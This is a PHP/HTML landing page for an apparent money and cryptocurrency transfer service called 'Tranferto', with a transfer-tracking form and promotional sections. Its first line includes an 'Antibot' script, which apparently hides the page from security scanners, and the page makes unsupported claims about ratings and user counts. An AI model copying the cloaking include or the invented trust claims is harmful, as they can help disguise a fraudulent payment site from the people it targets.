<?php
require_once __DIR__ . '/templates/Antibot/anti-v2.php';

session_start();
?>
<!doctype html>
<html class="no-js" lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Tranferto - Money Transfer and Online Payment</title>

    <link rel="shortcut icon" href="/assets/img/fav.png" type="image/x-icon">
    <link rel="stylesheet" href="/assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="/assets/css/fontawesome.min.css">
    <link rel="stylesheet" href="/assets/css/plugin/nice-select.css">
    <link rel="stylesheet" href="/assets/css/plugin/slick.css">
    <link rel="stylesheet" href="/assets/css/custom-family.css">
    <link rel="stylesheet" href="/assets/css/plugin/magnific-popup.css">
    <link rel="stylesheet" href="/assets/css/plugin/animate.css">
    <link rel="stylesheet" href="/assets/css/style.css">
    <link rel="stylesheet" href="/assets/css/style-rtl.min.css" id="rtl-stylesheet" disabled>
    <link href="https://fonts.googleapis.com/css2?family=Jost:wght@400;600&display=swap" rel="stylesheet">

    <style>
        /* Root variables from Tranferto template */
        :root {
            --body-font: "Jost", sans-serif;
            --body-color: #FFFFFF;
            --primary-color: #4743c9;
            --head-color: #0c266c;
            --para-color: #0c266c;
        }

        /* Base styles */
        body {
            font-family: var(--body-font);
            background-color: var(--body-color);
            font-size: 18px;
            line-height: 30px;
            padding: 0;
            margin: 0;
            font-weight: 400;
        }

        /* Container styles */
        .container {
            width: 100%;
            padding-right: 15px;
            padding-left: 15px;
            margin-right: auto;
            margin-left: auto;
            max-width: 1140px;
        }

        /* Row and column styles */
        .row {
            display: flex;
            flex-wrap: wrap;
            margin-right: -15px;
            margin-left: -15px;
        }

        .col-xl-3, .col-md-3, .col-sm-6 {
            position: relative;
            width: 100%;
            padding-right: 15px;
            padding-left: 15px;
        }

        /* Custom margin utility */
        .cus-mar {
            margin-bottom: -20px;
        }

        /* Counter section styles */
        .counter-section {
            position: relative;
            padding: 70px 30px 65px;
            margin-top: -110px;
            transform: translateZ(10px);
            margin-bottom: 20px;
        }

        .counter-section::before {
            position: absolute;
            content: "";
            width: 70%;
            border-radius: 20px;
            background-color: rgb(255, 255, 255);
            box-shadow: 2px 3.464px 24px 0px rgba(106, 105, 194, 0.25);
            height: 100%;
            top: 0;
            left: 15%;
            z-index: -1;
        }

        /* Single area styles */
        .single-area {
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            text-align: center;
            padding: 20px 0;
        }

        .single-area h2 {
            color: var(--primary-color);
            font-size: 57px;
            line-height: 74.1px;
            margin-top: -16px;
            font-weight: 600;
            padding: 0;
            margin: 0;
            display: flex;
            align-items: center;
        }

        .single-area h2 span.counter {
            font-size: inherit;
            font-weight: inherit;
            color: inherit;
            margin-right: 5px;
        }

        .single-area h2 span.plus {
            font-size: inherit;
            font-weight: inherit;
            color: inherit;
        }

        /* Text area styles */
        .text-area {
            text-align: center;
        }

        .text-area p {
            margin: 0;
            font-family: var(--body-font);
            font-size: 18px;
            font-weight: 400;
            color: var(--para-color);
            line-height: 30px;
            margin-top: 10px;
        }

        /* Animation for fadeInUp */
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translate3d(0, 100%, 0);
            }
            to {
                opacity: 1;
                transform: translate3d(0, 0, 0);
            }
        }

        .fadeInUp {
            animation: fadeInUp 1s ease-in-out forwards;
        }

        /* Responsive adjustments */
        @media (max-width: 1199px) {
            .counter-section .single-area {
                margin-bottom: 30px;
            }
        }

        @media (max-width: 991px) {
            .counter-section {
                padding: 50px 30px 10px;
            }
            .col-md-3 {
                flex: 0 0 25%;
                max-width: 25%;
            }
        }

        @media (max-width: 767px) {
            .col-sm-6 {
                flex: 0 0 50%;
                max-width: 50%;
            }
            .single-area h2 {
                font-size: 40px;
                line-height: 52px;
            }
            .text-area p {
                font-size: 16px;
                line-height: 24px;
            }
        }

        @media (max-width: 575px) {
            .counter-section {
                padding: 40px 30px 5px;
            }
            .single-area h2 {
                font-size: 30px;
                line-height: 36px;
            }
            .text-area p {
                font-size: 15px;
                line-height: 19px;
            }
        }

        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 25px;
            border-radius: 5px;
            color: white;
            font-weight: bold;
            z-index: 1000;
            animation: slideIn 0.5s ease-out;
        }
        
        .notification.error {
            background-color: #ff4444;
        }
        
        .notification.success {
            background-color: #00C851;
        }
        
        @keyframes slideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
    </style>
</head>

<body>
    <!-- start preloader -->
    <div class="preloader" id="preloader"></div>
    <!-- end preloader -->

    <!-- Scroll To Top Start-->
    <a href="javascript:void(0)" class="scrollToTop"><i class="fas fa-angle-double-up"></i></a>
    <!-- Scroll To Top End -->

    <!-- header-section start -->
    <header class="header-section">
        <div class="overlay">
            <div class="container">
                <div class="row d-flex header-area">
                    <nav class="navbar d-flex navbar-expand-lg navbar-dark">
                        <a class="navbar-brand" href="/">
                            <img src="/assets/img/logojb.png" class="logo" alt="logo">
                        </a>
                        <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                            data-bs-target="#navbarNavDropdown" aria-label="Toggle navigation">
                            <i class="fas fa-bars"></i>
                        </button>
                        <div class="collapse navbar-collapse justify-content-end" id="navbarNavDropdown">
                            <ul class="navbar-nav">
                                <li class="nav-item dropdown">
                                    <a class="nav-link active" href="/" role="button" data-bs-toggle="">
                                        Home
                                    </a>
                                </li>
                                <li class="nav-item">
                                    <a class="nav-link" href="/about-us">About Us</a>
                                </li>
                                <li class="nav-item">
                                    <a class="nav-link" href="/our-team">Our Team</a>
                                </li>
                                <li class="nav-item">
                                    <a class="nav-link" href="/contact">Contact Us</a>
                                </li>
                                <li class="nav-item dropdown">
                                    <a class="nav-link" href="javascript:void(0)" role="button" data-bs-toggle="dropdown">
                                        More
                                    </a>
                                    <div class="dropdown-menu show mega-menu">
                                        <ul class="dropdown">
                                            <li><a class="nav-item" href="/about-us">About Us</a></li>
                                            <li><a class="nav-item" href="/our-team">Our Team</a></li>
                                            <li><a class="nav-item" href="/privacy-policy">Privacy Policy</a></li>
                                            <li><a class="nav-item" href="/terms-conditions">Terms Conditions</a></li>
                                            <li><a class="nav-item" href="/login">Login</a></li>
                                            <li><a class="nav-item" href="/register">Register</a></li>
                                        </ul>
                                    </div>
                                </li>
                            </ul>
                            <div class="right-area header-action d-flex align-items-center">
                                <a href="/login" class="cmn-btn login">Login</a>
                                <a href="/register" class="cmn-btn">Sign up</a>
                            </div>
                        </div>
                    </nav>
                </div>
            </div>
        </div>
    </header>
    <!-- header-section end -->

    <!-- banner-section start -->
    <section class="banner-section">
        <div class="banner-content d-flex align-items-center">
            <div class="container">
                <div class="illu-item">
                    <img class="item-1" src="/assets/img/ban-frame-1.png" alt="image">
                    <img class="item-2" src="/assets/img/ban-frame-2.png" alt="image">
                    <img class="item-3" src="/assets/img/ban-frame-3.png" alt="image">
                    <img class="item-4" src="/assets/img/ban-frame-4.png" alt="image">
                </div>
                <div class="row justify-content-start">
                    <div class="col-lg-7 col-md-10">
                        <div class="main-content">
                            <div class="top-area justify-content-center">
                                <h1 style="color: #FEA800;">Instantly pay the world</h1>
                                <p class="xxlr" style="color: #ffffff;">A simple and highly secure Money & Cryptocurrencies transfer around the world</p>
                                <form action="/track-transfer" method="POST" class="tracking-form" onsubmit="return validateTrackingCode()">
                                    <div class="input-field d-flex">
                                        <input type="text" name="transaction_code" class="form-control" placeholder="Enter 8-digit tracking code" maxlength="8" required>
                                        <button type="submit" class="cmn-btn"><span>TRACK TRANSFER</span></button>
                                    </div>
                                </form>
                                <div class="bottom-banner d-flex align-items-center">
                                    <div class="left">
                                        <a class="icon mfp-iframe popupvideo" href="https://www.youtube.com/watch?v=MJ0zpsWQ_XM">
                                            <img src="/assets/img/video-icon.png" alt="icon">
                                        </a>
                                    </div>
                                    <div class="right d-grid">
                                        <h5>30M+</h5>
                                        <div class="review d-flex align-items-center">
                                            <h6>5.0</h6>
                                            <a href="javascript:void(0)"><i class="fas fa-star"></i></a>
                                            <a href="javascript:void(0)"><i class="fas fa-star"></i></a>
                                            <a href="javascript:void(0)"><i class="fas fa-star"></i></a>
                                            <a href="javascript:void(0)"><i class="fas fa-star"></i></a>
                                            <a href="javascript:void(0)"><i class="fas fa-star"></i></a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="right-illu">
                    <img class="right-1 wow fadeInUp" src="/assets/img/ban-right.png" alt="image">
                </div>
            </div>
        </div>
    </section>
    <!-- banner-section end -->

    <!-- Features In start -->
    <section class="features-section">
        <div class="overlay pt-120 pb-120">
            <div class="container wow fadeInUp">
                <div class="row justify-content-center text-center">
                    <div class="col-lg-8">
                        <div class="section-header">
                            <h2 class="title">Why we're trusted by millions worldwide</h2>
                            <p>Tranferto is a fast and secure service that lets you transfer Money & Cryptocurrencies online using a computer, smartphone..</p>
                        </div>
                    </div>
                </div>
                <div class="row wrapper">
                    <div class="col-lg-3 col-md-6">
                        <div class="single-item text-center">
                            <div class="icon">
                                <img src="/assets/img/features-icon-1.png" alt="icon">
                            </div>
                            <h5>Affordable</h5>
                            <p>Low fees on international Money & Cryptocurrencies transfers – always</p>
                        </div>
                    </div>
                    <div class="col-lg-3 col-md-6">
                        <div class="single-item text-center">
                            <div class="icon">
                                <img src="/assets/img/features-icon-2.png" alt="icon">
                            </div>
                            <h5>Simple</h5>
                            <p>Send Money & Cryptocurrencies on smartphone or online anytime from anywhere</p>
                        </div>
                    </div>
                    <div class="col-lg-3 col-md-6">
                        <div class="single-item text-center">
                            <div class="icon">
                                <img src="/assets/img/features-icon-3.png" alt="icon">
                            </div>
                            <h5>Quick</h5>
                            <p>Send Money & Cryptocurrencies to your loved ones in minutes</p>
                        </div>
                    </div>
                    <div class="col-lg-3 col-md-6">
                        <div class="single-item text-center">
                            <div class="icon">
                                <img src="/assets/img/features-icon-4.png" alt="icon">
                            </div>
                            <h5>Safe & Secure</h5>
                            <p>Our 4-star Trustpilot rating speaks for itself</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- Features In end -->

    <!-- Customers In start -->
    <section class="customers-section">
        <div class="overlay pb-120 d-flex justify-content-center">
            <div class="container">
                <div class="row justify-content-center text-center">
                    <div class="col-lg-12">
                        <div class="customers-area">
                            <div class="element po-1">
                                <div class="image-area">
                                    <p class="item-1">Great Service!</p>
                                    <img class="item-1" src="/assets/img/customers-1.png" alt="image">
                                </div>
                            </div>
                            <div class="element po-2">
                                <div class="image-area">
                                    <p class="item-2">Awesome!</p>
                                    <img class="item-2" src="/assets/img/customers-2.png" alt="image">
                                </div>
                            </div>
                            <div class="element po-3">
                                <div class="image-area">
                                    <p class="item-3">Tranferto c'est TOP</p>
                                    <img class="item-3" src="/assets/img/customers-3.png" alt="image">
                                </div>
                            </div>
                            <div class="element po-4">
                                <div class="image-area">
                                    <p class="item-4">Rápido y seguro, eso es lo que estoy buscando.</p>
                                    <img class="item-4" src="/assets/img/customers-4.png" alt="image">
                                </div>
                            </div>
                            <div class="element po-5">
                                <div class="image-area">
                                    <p class="item-5">我喜欢它</p>
                                    <img class="item-5" src="/assets/img/customers-5.png" alt="image">
                                </div>
                            </div>
                            <div class="element po-6">
                                <div class="image-area">
                                    <p class="item-6">beste Dienstleistungen</p>
                                    <img class="item-6" src="/assets/img/customers-6.png" alt="image">
                                </div>
                            </div>
                            <div class="element po-7">
                                <div class="image-area">
                                    <p class="item-7">お勧めします</p>
                                    <img class="item-7" src="/assets/img/customers-7.png" alt="image">
                                </div>
                            </div>
                            <div class="circle">
                                <img src="/assets/img/customers-bg.png" alt="Image">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- Customers In end -->

    <!-- Why choose us In start -->
    <section class="why-choose-us">
        <div class="overlay pt-120 cus-pad">
            <div class="container">
                <div class="main-content">
                    <div class="row d-flex justify-content-center">
                        <div class="col-lg-9">
                            <div class="section-header text-center">
                                <h2 class="title">Secure Money/Cryptocurrencies transfers you can trust</h2>
                                <p>Send and receive money & cryptocurrencies in minutes from people you know and trust</p>
                            </div>
                        </div>
                    </div>
                    <div class="top-wrapper">
                        <div class="row wrapper">
                            <div class="col-lg-3 col-md-6">
                                <div class="single-item text-center">
                                    <div class="icon">
                                        <img src="/assets/img/choose-us-icon-7.png" alt="icon">
                                    </div>
                                    <h5>Track My Transfer</h5>
                                    <p>With Tranferto you can know all the important information about your transfer.</p>
                                </div>
                            </div>
                            <div class="col-lg-3 col-md-6">
                                <div class="single-item text-center">
                                    <div class="icon">
                                        <img src="/assets/img/choose-us-icon-1.png" alt="icon">
                                    </div>
                                    <h5>Global Network</h5>
                                    <p>We send money to 100+ countries and open to new countries regularly</p>
                                </div>
                            </div>
                            <div class="col-lg-3 col-md-6">
                                <div class="single-item text-center">
                                    <div class="icon">
                                        <img src="/assets/img/choose-us-icon-3.png" alt="icon">
                                    </div>
                                    <h5>Multi trans.option</h5>
                                    <p>Send your money/cryptocurencies however you want - via cards and bank accounts and online wallets or other option</p>
                                </div>
                            </div>
                            <div class="col-lg-3 col-md-6">
                                <div class="single-item text-center">
                                    <div class="icon">
                                        <img src="/assets/img/choose-us-icon-4.png" alt="icon">
                                    </div>
                                    <h5>Live exchange Rate</h5>
                                    <p>Our exchange rates are live 24/7. You take more when it goes up</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- Why choose us In end -->

    <!-- Footer Area Start -->
    <footer class="footer-section">
        <div class="overlay pt-120 pb-120">
            <div class="container">
                <div class="row wrapper">
                    <div class="col-lg-3 col-md-6">
                        <div class="single-area">
                            <h5>COMPANY</h5>
                            <ul class="items">
                                <li><a href="/about-us">About Us</a></li>
                                <li><a href="/our-team">Management Team</a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-lg-3 col-md-6">
                        <div class="single-area">
                            <h5>Support</h5>
                            <ul class="items">
                                <li><a href="/contact">Contact Us</a></li>
                                <li><a href="/login">Your account</a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-lg-4 col-md-6">
                        <div class="single-area">
                            <h5>Subscribe to our news</h5>
                            <p>Get the latest happenings and tips from Tranferto</p>
                            <form action="#">
                                <div class="subscribe d-flex">
                                    <input type="email" placeholder="Your Email Address">
                                    <button><img src="/assets/img/send.png" alt="icon"></button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="footer-bottom">
            <div class="container">
                <div class="main-content">
                    <div class="row d-flex align-items-center">
                        <div class="col-lg-6 col-md-8 cus-order d-flex justify-content-md-start justify-content-center">
                            <div class="left-area">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
    <!-- Footer Area End -->

    <script src="/assets/js/jquery.min.js"></script>
    <script src="/assets/js/proper-min.js"></script>
    <script src="/assets/js/bootstrap.min.js"></script>
    <script src="/assets/js/fontawesome.js"></script>
    <script src="/assets/js/plugin/slick.js"></script>
    <script src="/assets/js/plugin/jquery.magnific-popup.min.js"></script>
    <script src="/assets/js/plugin/jquery.nice-select.min.js"></script>
    <script src="/assets/js/plugin/wow.min.js"></script>
    <script src="/assets/js/plugin/plugin.js"></script>
    <script src="/assets/js/main.js"></script>
    <script src="/assets/js/crypto-ticker.js" defer></script>
    <script>
        function validateTrackingCode() {
            const code = document.querySelector('input[name="transaction_code"]').value;
            if (code.length !== 8) {
                showNotification('Tracking code must be exactly 8 characters long', 'error');
                return false;
            }
            return true;
        }

        function showNotification(message, type) {
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            notification.textContent = message;
            document.body.appendChild(notification);
            
            setTimeout(() => {
                notification.style.animation = 'slideOut 0.5s ease-out';
                setTimeout(() => notification.remove(), 500);
            }, 5000);
        }

        // Check for flash messages
        <?php if (isset($_SESSION['flash_messages'])): ?>
            <?php foreach ($_SESSION['flash_messages'] as $message): ?>
                showNotification('<?php echo htmlspecialchars($message['text']); ?>', '<?php echo htmlspecialchars($message['type']); ?>');
            <?php endforeach; ?>
            <?php unset($_SESSION['flash_messages']); ?>
        <?php endif; ?>
    </script>
</body>
</html> 